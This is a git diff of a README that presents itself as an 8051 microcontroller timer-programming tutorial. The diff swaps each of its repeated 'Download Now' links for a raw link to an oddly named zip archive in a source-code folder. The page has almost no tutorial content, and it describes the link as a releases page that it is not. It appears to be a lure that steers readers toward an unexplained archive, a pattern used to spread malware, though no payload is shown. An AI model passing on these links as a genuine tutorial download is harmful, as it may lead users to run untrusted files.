@@ -1,7 +1,7 @@
 # 🎉 Configuring-and-Programming-the-Timers-of-8051-Tutorial - Learn Timer Programming with Ease
 
 ## 📥 Download Now
-[![Download](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)
+[![Download](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)
 
 ## 📚 Introduction
 Welcome to the **Configuring and Programming the Timers of 8051 Tutorial**. This guide helps you understand how to program the 16-bit timers (T0, T1, and T2) of the 8051 Microcontroller, specifically the W78E052DDG model. With this tutorial, you'll gain valuable insights into timer programming, useful for any 8051-related project.
@@ -17,7 +17,7 @@ This section shows you how to get started with the tutorial. You do not need any
 
 1. **Visit the Download Page**: Click the link below to access the releases page.
 
-   [Download Now](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)
+   [Download Now](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)
 
 2. **Choose the Latest Release**: On the releases page, you will see a list of available versions. Always choose the latest one for the best features and fixes.
 
@@ -61,7 +61,7 @@ If you have questions or need help, feel free to reach out. Preferably, use the 
 ## 📥 Download & Install
 When you are ready to dive into learning, don’t forget to download the tutorial from the link below:
 
-[Download Now](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)
+[Download Now](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)
 
 ## 🏷️ Topics Covered
 This tutorial includes topics such as:
@@ -76,4 +76,4 @@ These topics provide a broad overview of using timers in microcontroller project
 By following this tutorial, you will acquire the skills necessary to program the timers of the 8051 microcontroller effectively. Just take your time with each section, and soon you will be able to apply what you've learned to your own projects. Happy coding!
 
 ## 🚀 Download Now
-[![Download](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)](https://github.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/raw/refs/heads/main/_1_8051_Datasheets/of_Configuring_Tutorial_the_Timers_Programming_and_v1.3.zip)
+[![Download](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)](https://raw.githubusercontent.com/Marc067/Configuring-and-Programming-the-Timers-of-8051-Tutorial/main/_2_Kiel_uVision_Source_Codes_C_lang/and_of_Programming_the_Tutorial_Configuring_Timers_v2.1.zip)
